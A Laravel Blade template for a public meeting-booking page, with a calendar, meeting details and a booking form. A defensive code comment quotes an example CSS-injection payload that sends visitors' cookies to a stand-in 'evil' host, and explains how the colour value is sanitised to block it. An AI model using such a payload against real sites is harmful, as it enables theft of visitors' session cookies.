@php
    use Illuminate\Support\Carbon;
    $today = Carbon::today();
    // Monday-first grid
    $firstDay = $today->copy()->startOfMonth();
    $monthStart = $firstDay->copy()->startOfWeek(Carbon::MONDAY);
    $monthEnd = $firstDay->copy()->endOfMonth()->endOfWeek(Carbon::SUNDAY);

    $gridDays = [];
    $cursor = $monthStart->copy();
    while ($cursor->lte($monthEnd)) {
        $gridDays[] = $cursor->copy();
        $cursor->addDay();
    }
@endphp
<!DOCTYPE html>
<html lang="{{ app()->getLocale() }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>{{ __('booking.page_title_book_with', ['meeting' => $meetingType->name, 'host' => $host->name]) }}</title>
    <meta name="description" content="{{ \Illuminate\Support\Str::limit($meetingType->description ?? __('booking.meta_default_schedule_with', ['host' => $host->name]), 150) }}">
    <meta property="og:title" content="{{ $meetingType->name }}">
    <meta property="og:description" content="{{ \Illuminate\Support\Str::limit($meetingType->description ?? '', 150) }}">
    <link rel="stylesheet" href="{{ asset('css/views/public/booking/show.css') }}">
</head>
<body>
@php
    // CSS-context defense: $meetingType->color lands inside an
    // inline `style="..."` attribute as a CSS custom-property value.
    // Filament's ColorPicker validates ONLY on the client — a malicious
    // tenant who tampers the Livewire payload can persist e.g.
    //   `red; }; body{background:url('//evil/?'+document.cookie+');}`
    // which then renders into every public booking page they own and
    // breaks out of the `--bs-accent` declaration in a visitor's
    // browser.  Blade `{{ }}` HTML-escapes — it does NOT defend the
    // CSS context (browsers entity-decode `&#039;` back to `'` BEFORE
    // the CSS parser runs).  ColorSafety::safeHex enforces the strict
    // `#rgb` / `#rgba` / `#rrggbb` / `#rrggbbaa` shape, falling back to
    // the default indigo when any non-hex content is detected.
    $safeAccent = \App\Support\ColorSafety::safeHex($meetingType->color, '#4f46e5');
@endphp
{{-- Per-meeting accent color is passed as a CSS custom property
     (`--bs-accent`) — the single irreducibly-dynamic style declaration
     for this page.  Booking endpoints + future-days config are passed
     via data-* attributes consumed by public/js/views/public/booking/show.js. --}}
<div class="wrap"
     style="--bs-accent: {{ $safeAccent }};"
     data-book-url="{{ route('book.create', ['user' => $host->id, 'slug' => $meetingType->slug]) }}"
     data-avail-url="{{ route('book.availability', ['user' => $host->id, 'slug' => $meetingType->slug]) }}"
     data-future-days-max="{{ (int) $meetingType->future_days_max }}"
     data-confirm-booking-label="{{ __('booking.confirm_booking') }}"
     data-error-generic="{{ __('booking.error_generic') }}"
     data-error-network="{{ __('booking.error_network') }}"
     data-loading-times="{{ __('booking.loading_times') }}"
     data-no-available-times="{{ __('booking.no_available_times') }}"
     data-could-not-load-times="{{ __('booking.could_not_load_times') }}"
     data-at-time-separator="{{ __('booking.at_time_separator') }}"
     data-booking-in-progress="{{ __('booking.booking_in_progress') }}"
     data-months="{{ json_encode([
        __('booking_calendar.month_jan'),
        __('booking_calendar.month_feb'),
        __('booking_calendar.month_mar'),
        __('booking_calendar.month_apr'),
        __('booking_calendar.month_may'),
        __('booking_calendar.month_jun'),
        __('booking_calendar.month_jul'),
        __('booking_calendar.month_aug'),
        __('booking_calendar.month_sep'),
        __('booking_calendar.month_oct'),
        __('booking_calendar.month_nov'),
        __('booking_calendar.month_dec'),
     ], JSON_UNESCAPED_UNICODE | JSON_HEX_APOS | JSON_HEX_QUOT) }}">
    <div class="grid">
        <aside class="side">
            <div class="host">{{ $host->name }}</div>
            <h1><span class="dot"></span>{{ $meetingType->name }}</h1>
            <div class="dur">
                <svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"/></svg>
                {{ __('booking.duration_minutes', ['minutes' => $meetingType->duration_minutes]) }}
            </div>
            @if($meetingType->description)
                <p class="desc">{{ $meetingType->description }}</p>
            @endif
            @if($meetingType->location_type !== 'custom' || $meetingType->location_details)
                <div class="loc">
                    <strong>{{ __('booking.location_label') }}</strong>
                    {{ match($meetingType->location_type) {
                        'google_meet' => __('booking.location_google_meet'),
                        'zoom' => __('booking.location_zoom'),
                        'phone' => __('booking.location_phone'),
                        'in_person' => __('booking.location_in_person'),
                        default => __('booking.location_details_below'),
                    } }}
                    @if($meetingType->location_details)
                        <div class="bs-loc-detail">{{ $meetingType->location_details }}</div>
                    @endif
                </div>
            @endif
        </aside>
        <main class="main">
            <h2>{{ __('booking.select_date_and_time') }}</h2>
            <div class="cal-head">
                <h3 id="cal-title"></h3>
                <div class="cal-nav">
                    <button type="button" id="prev-month" aria-label="{{ __('booking.aria_previous_month') }}">&larr;</button>
                    <button type="button" id="next-month" aria-label="{{ __('booking.aria_next_month') }}">&rarr;</button>
                </div>
            </div>
            <div class="grid7">
                <div class="dow">{{ __('booking.dow_mon') }}</div><div class="dow">{{ __('booking.dow_tue') }}</div><div class="dow">{{ __('booking.dow_wed') }}</div><div class="dow">{{ __('booking.dow_thu') }}</div><div class="dow">{{ __('booking.dow_fri') }}</div><div class="dow">{{ __('booking.dow_sat') }}</div><div class="dow">{{ __('booking.dow_sun') }}</div>
            </div>
            <div class="grid7" id="cal-days"></div>
            <div class="slots" id="slots"></div>
        </main>
    </div>
</div>

<div class="overlay" id="modal">
    <div class="modal">
        <h3>{{ __('booking.confirm_your_booking_heading') }}</h3>
        <div class="when" id="m-when"></div>
        <form id="form" autocomplete="on">
            <div class="hp"><input type="text" name="__hp" tabindex="-1" autocomplete="off"></div>
            <div class="field"><label>{{ __('booking.your_name_label') }} <span class="req">*</span></label><input type="text" name="name" required maxlength="150"><div class="err" data-for="name"></div></div>
            <div class="field"><label>{{ __('booking.email_label') }} <span class="req">*</span></label><input type="email" name="email" required maxlength="255"><div class="err" data-for="email"></div></div>
            <div class="field"><label>{{ __('booking.phone_optional_label') }}</label><input type="tel" name="phone" maxlength="50"></div>
            <div class="field"><label>{{ __('booking.notes_label') }}</label><textarea name="notes" rows="3" maxlength="2000"></textarea></div>
            <div class="btn-row">
                <button type="button" class="btn btn-ghost" id="cancel">{{ __('booking.back') }}</button>
                <button type="submit" class="btn btn-primary" id="submit">{{ __('booking.confirm_booking') }}</button>
            </div>
        </form>
    </div>
</div>

<script src="{{ asset('js/views/public/booking/show.js') }}" defer></script>
</body>
</html>
